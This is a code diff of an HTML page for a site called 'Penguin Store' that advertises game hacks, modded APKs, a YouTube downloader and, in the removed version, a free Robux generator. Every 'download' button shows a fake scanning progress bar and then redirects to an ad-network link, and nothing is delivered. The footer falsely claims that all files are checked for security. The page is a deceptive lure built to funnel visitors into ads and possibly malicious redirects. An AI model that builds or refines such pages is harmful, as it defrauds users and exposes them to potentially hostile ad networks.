@@ -3,133 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Penguin Store - 프리미엄 앱 & 게임 MOD 센터</title>
+    <title>PENGUIN STORE - Official Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;700;900&family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background: #f0f2f5; color: #333; line-height: 1.6; }
-        header { background: #1a1a1a; color: white; padding: 12px 8%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: bold; }
-        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; }
-        .section-title { font-size: 22px; font-weight: bold; margin: 40px 0 20px; border-left: 6px solid #e74c3c; padding-left: 15px; color: #333; }
-        .blue-title { border-left-color: #00acee; } /* 펭귄 느낌의 하늘색 포인트 */
-        .ad-banner-728 { width: 100%; display: flex; justify-content: center; margin: 25px 0; min-height: 90px; }
-        .app-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; }
-        .app-card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); cursor: pointer; transition: 0.3s; border: 1px solid #eee; position: relative; }
-        .app-card:hover { transform: translateY(-8px); box-shadow: 0 12px 25px rgba(0,0,0,0.1); }
-        .tag-hot { position: absolute; top: 0; right: 0; background: #e74c3c; color: white; font-size: 11px; padding: 5px 12px; border-bottom-left-radius: 12px; font-weight: bold; }
-        .app-top { display: flex; align-items: center; margin-bottom: 15px; }
-        .app-top img { width: 65px; height: 65px; border-radius: 14px; margin-right: 15px; object-fit: cover; }
-        .app-info h3 { margin: 0; font-size: 18px; color: #1a1a1a; }
-        .app-desc { font-size: 14px; color: #555; height: 60px; overflow: hidden; margin-bottom: 20px; }
-        .btn-install { background: #28a745; color: white; text-align: center; padding: 12px; border-radius: 6px; font-weight: bold; transition: 0.2s; }
-        footer { background: #1a1a1a; color: #bdc3c7; padding: 50px 8% 30px; margin-top: 80px; font-size: 13px; border-top: 4px solid #00acee; }
-        .footer-logo { font-size: 26px; font-weight: bold; color: white; margin-bottom: 15px; }
-        #download-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 10000; }
-        .modal-content { background: white; padding: 35px; border-radius: 20px; width: 90%; max-width: 420px; text-align: center; }
-        .progress-bar { width: 100%; background: #eee; height: 14px; border-radius: 10px; margin: 25px 0 10px; overflow: hidden; display: none; }
-        .progress-fill { width: 0%; height: 100%; background: #00acee; transition: 0.1s; }
+        :root { --primary: #007bff; --dark: #121212; --success: #28a745; --yt-red: #ff0000; --bg: #f8f9fa; }
+        body { font-family: 'Roboto', 'Noto Sans KR', sans-serif; margin: 0; background: var(--bg); color: #333; -webkit-font-smoothing: antialiased; }
+        
+        /* 헤더: 이모지 제거 및 폰트 강조 */
+        header { background: #fff; padding: 15px 10%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; position: sticky; top:0; z-index:100; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
+        .logo { font-size: 20px; font-weight: 900; color: var(--dark); text-transform: uppercase; letter-spacing: -0.5px; }
+        .logo span { color: var(--primary); font-weight: 300; }
+        .nav-links { font-size: 13px; font-weight: 700; color: #666; display: flex; gap: 25px; text-transform: uppercase; }
+
+        .container { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
+        .ad-slot { width: 100%; display: flex; justify-content: center; margin: 25px 0; overflow: hidden; }
+
+        /* 유튜브 다운로더 섹션: 더 깔끔한 디자인 */
+        .yt-downloader-box { background: white; border-radius: 12px; padding: 50px 30px; text-align: center; margin-bottom: 50px; border: 1px solid #eee; }
+        .yt-downloader-box h2 { font-size: 26px; font-weight: 900; margin-top: 0; color: var(--dark); }
+        .yt-downloader-box p { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .input-group { display: flex; max-width: 650px; margin: 0 auto; gap: 0; border: 2px solid #eee; border-radius: 8px; overflow: hidden; transition: 0.3s; }
+        .input-group:focus-within { border-color: var(--dark); }
+        .yt-input { flex: 1; padding: 15px 20px; border: none; font-size: 15px; outline: none; }
+        .btn-convert { background: var(--dark); color: white; border: none; padding: 0 35px; font-weight: 700; cursor: pointer; font-size: 14px; text-transform: uppercase; transition: 0.2s; }
+        .btn-convert:hover { background: #333; }
+
+        /* 섹션 타이틀 */
+        .section-header { font-size: 14px; font-weight: 900; color: #bbb; text-transform: uppercase; letter-spacing: 1px; margin: 50px 0 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+
+        /* 앱 리스트 디자인 */
+        .app-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+        .app-card { background: #fff; border-radius: 12px; padding: 24px; transition: 0.25s; border: 1px solid #eee; cursor: pointer; display: flex; flex-direction: column; }
+        .app-card:hover { transform: translateY(-5px); box-shadow: 0 12px 30px rgba(0,0,0,0.06); border-color: #ddd; }
+        
+        .app-top { display: flex; gap: 18px; align-items: center; margin-bottom: 20px; }
+        .app-top img { width: 56px; height: 56px; border-radius: 12px; }
+        .app-title-area h3 { margin: 0; font-size: 17px; font-weight: 700; color: var(--dark); }
+        .app-ver { font-size: 11px; color: #aaa; margin-top: 2px; }
+        
+        .mod-tag { font-size: 11px; font-weight: 700; color: var(--success); text-transform: uppercase; margin-bottom: 20px; border-left: 3px solid var(--success); padding-left: 8px; }
+        .btn-get { background: #f1f3f5; color: var(--dark); text-align: center; padding: 12px; border-radius: 6px; font-weight: 700; font-size: 13px; transition: 0.2s; }
+        .app-card:hover .btn-get { background: var(--dark); color: white; }
+
+        /* 모달: 심플 디자인 */
+        #download-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); justify-content: center; align-items: center; z-index: 10000; }
+        .modal-body { background: #fff; padding: 40px; border-radius: 16px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.1); }
+        .modal-body h2 { font-size: 20px; font-weight: 900; margin-bottom: 5px; }
+        .progress-container { width: 100%; background: #f0f0f0; height: 6px; border-radius: 3px; overflow: hidden; margin-top: 25px; }
+        .progress-fill { width: 0%; height: 100%; background: var(--dark); transition: 0.1s; }
+
+        footer { background: #fff; color: #999; padding: 60px 10%; margin-top: 100px; text-align: left; font-size: 11px; border-top: 1px solid #eee; }
+        .footer-logo { font-size: 16px; font-weight: 900; color: #333; margin-bottom: 15px; letter-spacing: -0.5px; }
     </style>
 </head>
 <body>
 
 <header>
-    <div style="font-size: 24px; font-weight: bold;">🐧 Penguin Store</div>
-    <div class="nav-links"><span>Windows</span><span>Android</span><span>MOD버전</span><span>무료재화</span></div>
+    <div class="logo">PENGUIN<span>STORE</span></div>
+    <div class="nav-links">
+        <span>Games</span><span>Apps</span><span>Archive</span>
+    </div>
 </header>
 
 <div class="container">
-    <div class="ad-banner-728">
+    <div class="ad-slot">
         <script type="text/javascript">
             atOptions = { 'key' : '0fb8fb434f2da3b173620c96931b27b7', 'format' : 'iframe', 'height' : 90, 'width' : 728, 'params' : {} };
         </script>
         <script type="text/javascript" src="https://www.highperformanceformat.com/0fb8fb434f2da3b173620c96931b27b7/invoke.js"></script>
     </div>
 
-    <div class="section-title">독점 게임 MOD (버그판/핵)</div>
-    <div class="app-grid">
-        <div class="app-card" onclick="openModal('로블록스 핵 메뉴 v2.6', 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg', '감지되지 않는 최신 스크립트 실행기입니다. 월핵, 스피드핵 기능이 포함되어 있습니다.')">
-            <span class="tag-hot">HACK</span>
-            <div class="app-top">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="rbx">
-                <div class="app-info"><h3>Roblox Hack Menu</h3><p>v2.6 최신버전</p></div>
-            </div>
-            <p class="app-desc">Penguin Store 단독 배포! 강력한 정지 방지 스크립트가 포함된 통합 버전입니다.</p>
-            <div class="btn-install" style="background:#e74c3c;">핵 버전 다운로드</div>
-        </div>
-        <div class="app-card" onclick="openModal('브롤스타즈 버그판', 'https://upload.wikimedia.org/wikipedia/en/b/b1/Brawl_Stars_logo.png', '모든 브롤러와 스킨이 해금된 무제한 보석 에디션입니다.')">
-            <span class="tag-hot">MOD APK</span>
-            <div class="app-top">
-                <img src="https://upload.wikimedia.org/wikipedia/en/b/b1/Brawl_Stars_logo.png" alt="bs">
-                <div class="app-info"><h3>Brawl Stars MOD</h3><p>무한 재화 에디션</p></div>
-            </div>
-            <p class="app-desc">최신 업데이트 버전이 적용된 버그판입니다. 펭귄 스토어 보안 검사 완료.</p>
-            <div class="btn-install" style="background:#e74c3c;">버그판 다운로드</div>
+    <div class="yt-downloader-box">
+        <h2>Video & Audio Downloader</h2>
+        <p>Convert YouTube links to high-quality MP3 or MP4 formats instantly.</p>
+        <div class="input-group">
+            <input type="text" class="yt-input" id="yt-url" placeholder="Paste YouTube link here...">
+            <button class="btn-convert" onclick="openYTModal()">Convert</button>
         </div>
     </div>
 
-    <div style="margin: 40px 0; text-align: center;">
+    <div class="section-header">Verified Modifications</div>
+    <div class="app-grid">
+        <div class="app-card" onclick="openModal('Roblox Premium', 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg', 'Mod Menu / Multi-Jump / Wallhack')">
+            <div class="app-top">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="icon">
+                <div class="app-title-area"><h3>Roblox</h3><div class="app-ver">Build 2.608.615</div></div>
+            </div>
+            <div class="mod-tag">Menu: Fly, God Mode</div>
+            <div class="btn-get">GET APK</div>
+        </div>
+
+        <div class="app-card" onclick="openModal('YouTube ReVanced', 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', 'No Ads / Background Play / SponsorBlock')">
+            <div class="app-top">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="icon">
+                <div class="app-title-area"><h3>YouTube Pro</h3><div class="app-ver">Version 19.04.37</div></div>
+            </div>
+            <div class="mod-tag">Ads Disabled / Premium</div>
+            <div class="btn-get">GET APK</div>
+        </div>
+    </div>
+
+    <div class="ad-slot">
         <script async="async" data-cfasync="false" src="https://pl28670403.effectivegatecpm.com/eeb80f57c8e0dd2eee3e5678df8ef435/invoke.js"></script>
         <div id="container-eeb80f57c8e0dd2eee3e5678df8ef435"></div>
-    </div>
-
-    <div class="section-title blue-title">무료 게임 재화 & 계정 생성</div>
-    <div class="app-grid">
-        <div class="app-card" onclick="openModal('로블록스 Robux 충전기', 'https://upload.wikimedia.org/wikipedia/commons/c/ce/Roblox_Logo.svg', '계정 아이디만으로 안전하게 무료 로벅스를 충전합니다.')">
-            <div class="app-top">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="rbx">
-                <div class="app-info"><h3>무료 Robux 충전</h3><p>Robux Generator</p></div>
-            </div>
-            <p class="app-desc">비밀번호 요구 없이 Penguin Store 전용 채널을 통해 지급됩니다.</p>
-            <div class="btn-install">지금 받기</div>
-        </div>
     </div>
 </div>
 
 <footer>
-    <div class="footer-logo">🐧 Penguin Store</div>
-    <p>© 2024-2026 Penguin Store Global. All rights reserved.</p>
-    <p>본사: Reykjavik, Iceland | 고객지원: support@penguinstore.io</p>
-    <p style="font-size: 11px; color: #555; margin-top: 10px;">Penguin Store는 검증된 소프트웨어와 안전한 게임 환경을 지향합니다.</p>
+    <div class="footer-logo">PENGUIN STORE</div>
+    <p>Penguin Store is an independent repository for software modifications. We are not affiliated with Google, Roblox, or any other developers. All files are checked for security and stability before being listed.</p>
+    <p>© 2026 PENGUIN STORE GLOBAL. Powered by verified distributors.</p>
 </footer>
 
 <div id="download-modal">
-    <div class="modal-content">
-        <img id="modal-icon" src="" style="width:75px; border-radius:15px; margin-bottom: 15px;">
-        <h2 id="modal-title" style="margin: 0 0 10px 0; font-size: 22px; color: #1a1a1a;">앱 이름</h2>
-        <p id="modal-desc" style="font-size: 14px; color: #666; margin-bottom: 25px;">설명</p>
-        <button id="start-btn" onclick="startProcess()" style="background:#1a1a1a; color:white; border:none; padding:16px; width:100%; border-radius:10px; font-weight:bold; cursor:pointer; font-size:18px;">데이터 요청 시작</button>
-        <div id="loading-area" style="display:none;">
-            <p id="status-text" style="font-weight: bold; margin-bottom: 8px;">펭귄 서버 연결 중...</p>
-            <div class="progress-bar" id="p-bar"><div class="progress-fill" id="fill"></div></div>
+    <div class="modal-body">
+        <h2 id="m-title">Requesting...</h2>
+        <p id="m-mod" style="font-size:12px; color:#666;"></p>
+        <div id="loader" style="display:none;">
+            <div class="progress-container"><div class="progress-fill" id="fill"></div></div>
+            <p id="l-status" style="font-size:11px; font-weight:700; margin-top:10px; text-transform:uppercase; color:#999;">Initializing...</p>
         </div>
+        <button id="dl-btn" onclick="runLoader()" style="background:var(--dark); color:white; border:none; padding:15px; width:100%; border-radius:6px; font-weight:700; margin-top:20px; cursor:pointer;">START DOWNLOAD</button>
     </div>
 </div>
 
 <script>
-    function openModal(name, icon, desc) {
+    function openModal(name, icon, mod) {
         document.getElementById('download-modal').style.display = 'flex';
-        document.getElementById('modal-title').innerText = name;
-        document.getElementById('modal-icon').src = icon;
-        document.getElementById('modal-desc').innerText = desc;
+        document.getElementById('m-title').innerText = name;
+        document.getElementById('m-mod').innerText = mod;
     }
 
-    function startProcess() {
-        document.getElementById('start-btn').style.display = 'none';
-        document.getElementById('loading-area').style.display = 'block';
-        document.getElementById('p-bar').style.display = 'block';
-        let fill = document.getElementById('fill'), status = document.getElementById('status-text'), width = 0;
-        let interval = setInterval(() => {
-            if (width >= 100) {
-                clearInterval(interval);
-                status.innerText = "데이터 생성 완료! 이동 중...";
-                setTimeout(() => {
-                    location.href = "https://www.effectivegatecpm.com/p00qj5qd0k?key=cd7b4673866800948b201659235e684a";
-                }, 1500);
+    function openYTModal() {
+        let url = document.getElementById('yt-url').value;
+        if(!url) { alert('Please enter a valid URL.'); return; }
+        openModal('YT Downloader', '', 'High Quality Conversion (MP3/MP4)');
+    }
+
+    function runLoader() {
+        document.getElementById('dl-btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        let fill = document.getElementById('fill'), status = document.getElementById('l-status'), w = 0;
+        let itv = setInterval(() => {
+            if (w >= 100) {
+                clearInterval(itv);
+                location.href = "https://www.effectivegatecpm.com/p00qj5qd0k?key=cd7b4673866800948b201659235e684a";
             } else {
-                width++; fill.style.width = width + '%';
-                if(width == 40) status.innerText = "암호화 패키지 수신 중...";
-                if(width == 80) status.innerText = "최종 인증서 확인 중...";
+                w++; fill.style.width = w + '%';
+                if(w == 30) status.innerText = "Scanning File...";
+                if(w == 70) status.innerText = "Securing Connection...";
             }
-        }, 45);
+        }, 40);
     }
 </script>
 
